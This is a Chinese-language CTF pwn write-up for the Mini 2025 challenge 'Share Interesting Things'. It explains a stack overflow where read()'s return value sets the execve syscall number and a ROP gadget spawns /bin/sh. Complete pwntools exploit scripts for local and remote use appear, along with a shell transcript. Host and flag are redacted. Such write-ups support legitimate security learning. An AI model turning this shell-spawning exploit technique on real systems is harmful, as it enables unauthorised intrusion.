---
title: "Share Interesting Things"
published: 2026-10-24
description: "利用 read 返回值设置系统调用号，通过 syscall 执行 execve。"
tags: ["CTF", "Mini 2025", "Pwn", "ROP", "syscall"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

>TELL ME TELL ME
> *题面外链图片已移除（原链接包含服务器地址）。*

```zsh
❯ ./vuln
This time, I didn't use the libc, I think you can't hack me again!
Now can you share me something interesting?
>a
Anything else?
>a
```

本题在运行中提供了2次输入的机会，我们先阅读一下IDA分析出的伪代码
```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  write(fd: 1, buf: "This time, I didn't use the libc, I think you can't hack me again!\n", n: 0x43u);
  write(fd: 1, buf: "Now can you share me something interesting?\n>", n: 0x2Du);
  read(fd: 0, buf, nbytes: 0x60u);
  write(fd: 1, buf: "Anything else?\n>", n: 0x11u);
  return read(fd: 0, buf: &str1, nbytes: 0x40u);
}
```


## 漏洞分析

可以看到也是一样的栈溢出的问题，数组占32字节，但是可以写入96字节。值得注意的是，两次写入的对象不一样，首次是上面分配的地址，第二次则是一个字符串地址，我们看看这个字符串的内容：
```text
.bss:0000000000404080 str1            db    ? ;               ; DATA XREF: vuln+69↑o
.bss:0000000000404081                 db    ? ;
.bss:0000000000404082                 db    ? ;
.bss:0000000000404083                 db    ? ;
.bss:0000000000404084                 db    ? ;
```
似乎是空的，所以这个大概就是题目给我们的一块桌面，供我们自由操作的。

## 攻击原理

我们知道，寄存器rax是作为传递函数返回值用的，而read函数的返回值恰好就是读入字符的数量，同时，rax同样是Linux下syscall的一个调用参数，这题目中没有引入libc的system函数，无法执行指令，所以，我们可以绕过system, 直接使用syscall编号为59的execve来执行我们想要的程序，因此，我们可以在最后一个read的时候输入恰好59个字符，在第一个输入的时候，篡改返回地址，让它执行类似`pop rdi; syscall`一样的指令，其中，我们在第一个输入的时候，在篡改返回地址后再加一个“/bin/sh”的地址，这样，执行`pop rdi`的时候，就会把sh的地址存入rdi寄存器，也就是Linux AMD64 ABI下的函数的第一个参数，最终产生execve("/bin/sh")的效果 ，成功getshell。

我们可以用ROPgadget工具探查有什么类似`pop rdi; syscall`这样我们能利用的指令：
```zsh
❯ ROPgadget --binary ./vuln | grep "syscall"
0x0000000000401193 : add byte ptr [rax + 0x52], dl ; push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401191 : add byte ptr [rax], al ; add byte ptr [rax + 0x52], dl ; push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401156 : add byte ptr [rax], al ; add byte ptr [rcx + 0x328d48c7], cl ; mov edx, ecx ; syscall
0x0000000000401157 : add byte ptr [rax], al ; mov edi, eax ; lea rsi, [rdx] ; mov edx, ecx ; syscall
0x0000000000401192 : add byte ptr [rax], al ; push rax ; push rdx ; push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401158 : add byte ptr [rcx + 0x328d48c7], cl ; mov edx, ecx ; syscall
0x000000000040115c : lea esi, [rdx] ; mov edx, ecx ; syscall
0x000000000040115b : lea rsi, [rdx] ; mov edx, ecx ; syscall
0x0000000000401159 : mov edi, eax ; lea rsi, [rdx] ; mov edx, ecx ; syscall
0x000000000040115e : mov edx, ecx ; syscall
0x0000000000401199 : pop rdi ; syscall
0x0000000000401197 : pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401198 : pop rsi ; pop rdi ; syscall
0x0000000000401194 : push rax ; push rdx ; push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401196 : push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401195 : push rdx ; push rcx ; pop rdx ; pop rsi ; pop rdi ; syscall
0x0000000000401160 : syscall
```

可以看到恰好有一个合适的指令就在`0x401197`，非常完美，其内容是`pop rdx ; pop rsi ; pop rdi ; syscall`，能在syscall前先把rdx和rsi置零，防止出问题。


不过/bin/sh要哪里来呢，这就是我们说到的前面的桌面，也就是上述的str1。我们可以先输入/bin/sh\x00，之后再填充到59个字符，这样，我们就在内存中塞入了sh的地址，IDA显示str1的地址为`0x404080`，因此，我们上面说的sh的地址在这样写入后就是它。

## exp
```python
from pwn import *
context.arch = "amd64"
p = process("./vuln")
payload = b"A" * 40 + p64(0x401197) + p64(0) + p64(0) + p64(0x404080)
p.sendafter(b">", payload)
payload = b"/bin/sh\x00".ljust(59, b"0")
p.sendafter(b">", payload)
p.interactive()
```

运行一下成功了，拿远端
```python
from pwn import *
context.arch = "amd64"
p = remote("HOST_REDACTED", 0)
payload = b"A" * 40 + p64(0x401197) + p64(0) + p64(0) + p64(0x404080)
p.sendafter(b">", payload)
payload = b"/bin/sh\x00".ljust(59, b"0")
p.sendafter(b">", payload)
p.interactive()
```

```zsh
❯ python -u "/home/copper0so4/Downloads/attachment/exp.py"
[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
[*] Switching to interactive mode
\x00$ cat flag
[FLAG REDACTED]
```

拿到 flag 为`[FLAG REDACTED]`
